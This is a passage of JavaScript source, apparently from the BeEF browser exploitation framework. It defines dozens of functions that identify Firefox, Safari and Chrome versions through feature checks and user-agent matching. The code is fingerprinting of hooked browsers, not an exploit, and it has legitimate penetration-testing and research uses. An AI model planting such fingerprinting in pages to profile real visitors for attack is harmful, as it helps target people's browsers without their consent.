     * @example: beef.browser.isFF3_6()
     */
    isFF3_6: function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4: function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

    /**
     * Returns true if FF20
     * @example: beef.browser.isFF20()
     */
    isFF20: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
    },

    /**
     * Returns true if FF21
     * @example: beef.browser.isFF21()
     */
    isFF21: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: beef.browser.isFF22()
     */
    isFF22: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: beef.browser.isFF23()
     */
    isFF23: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: beef.browser.isFF24()
     */
    isFF24: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF25
     * @example: beef.browser.isFF25()
     */
    isFF25: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
    },

    /**
     * Returns true if FF26
     * @example: beef.browser.isFF26()
     */
    isFF26: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
    },

    /**
     * Returns true if FF27
     * @example: beef.browser.isFF27()
     */
    isFF27: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
    },

    /**
     * Returns true if FF28
     * @example: beef.browser.isFF28()
     */
    isFF28: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
    },

    /**
     * Returns true if FF29
     * @example: beef.browser.isFF29()
     */
    isFF29: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
    },

    /**
     * Returns true if FF30
     * @example: beef.browser.isFF30()
     */
    isFF30: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
    },

    /**
     * Returns true if FF31
     * @example: beef.browser.isFF31()
     */
    isFF31: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
    },

    /**
     * Returns true if FF32
     * @example: beef.browser.isFF32()
     */
    isFF32: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
    },

    /**
     * Returns true if FF33
     * @example: beef.browser.isFF33()
     */
    isFF33: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
    },

    /**
     * Returns true if FF34
     * @example: beef.browser.isFF34()
     */
    isFF34: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
    },

    /**
     * Returns true if FF35
     * @example: beef.browser.isFF35()
     */
    isFF35: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
    },

    /**
     * Returns true if FF36
     * @example: beef.browser.isFF36()
     */
    isFF36: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
    },

    /**
     * Returns true if FF37
     * @example: beef.browser.isFF37()
     */
    isFF37: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
    },

    /**
     * Returns true if FF38
     * @example: beef.browser.isFF38()
     */
    isFF38: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
    },

    /**
     * Returns true if FF39
     * @example: beef.browser.isFF39()
     */
    isFF39: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
    },

    /**
     * Returns true if FF40
     * @example: beef.browser.isFF40()
     */
    isFF40: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
    },

    /**
     * Returns true if FF41
     * @example: beef.browser.isFF41()
     */
    isFF41: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
    },

    /**
     * Returns true if FF42
     * @example: beef.browser.isFF42()
     */
    isFF42: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
    },

    /**
     * Returns true if FF43
     * @example: beef.browser.isFF43()
     */
    isFF43: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
    },

    /**
     * Returns true if FF.
     * @example: beef.browser.isFF()
     */
    isFF: function () {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4: function () {
        return (window.navigator.userAgent.match(/ Version\/4\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5: function () {
        return (window.navigator.userAgent.match(/ Version\/5\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6: function () {
        return (window.navigator.userAgent.match(/ Version\/6\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 7.xx
     * @example: beef.browser.isS7()
     */
    isS7: function () {
        return (window.navigator.userAgent.match(/ Version\/7\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 8.xx
     * @example: beef.browser.isS8()
     */
    isS8: function () {
        return (window.navigator.userAgent.match(/ Version\/8\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS: function () {
        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
    },

    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: beef.browser.isC19iOS()
     */
    isC19iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: beef.browser.isC20iOS()
     */
    isC20iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: beef.browser.isC21iOS()
     */
    isC21iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: beef.browser.isC22iOS()
     */
    isC22iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: beef.browser.isC23iOS()
     */
    isC23iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: beef.browser.isC24iOS()
     */
    isC24iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: beef.browser.isC25()
     */
    isC25: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: beef.browser.isC25iOS()
     */
    isC25iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: beef.browser.isC26()
     */
    isC26: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: beef.browser.isC26iOS()
     */
    isC26iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: beef.browser.isC27()
     */
    isC27: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: beef.browser.isC27iOS()
     */
    isC27iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: beef.browser.isC28()
     */
    isC28: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: beef.browser.isC28iOS()
     */
    isC28iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome 29.
     * @example: beef.browser.isC29()
     */
    isC29: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 29.
     * @example: beef.browser.isC29iOS()
     */
    isC29iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome 30.
     * @example: beef.browser.isC30()
     */
    isC30: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 30.
     * @example: beef.browser.isC30iOS()
     */
    isC30iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome 31.
     * @example: beef.browser.isC31()
     */
    isC31: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 31.
     * @example: beef.browser.isC31iOS()
     */
    isC31iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome 32.
     * @example: beef.browser.isC32()
     */
    isC32: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 32.
     * @example: beef.browser.isC32iOS()
     */
    isC32iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome 33.
     * @example: beef.browser.isC33()
     */
    isC33: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 33.
     * @example: beef.browser.isC33iOS()
     */
    isC33iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome 34.
     * @example: beef.browser.isC34()
     */
    isC34: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 34.
     * @example: beef.browser.isC34iOS()
     */
    isC34iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome 35.
     * @example: beef.browser.isC35()
     */
    isC35: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 35.
     * @example: beef.browser.isC35iOS()
     */
    isC35iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome 36.
     * @example: beef.browser.isC36()
     */
    isC36: function () {
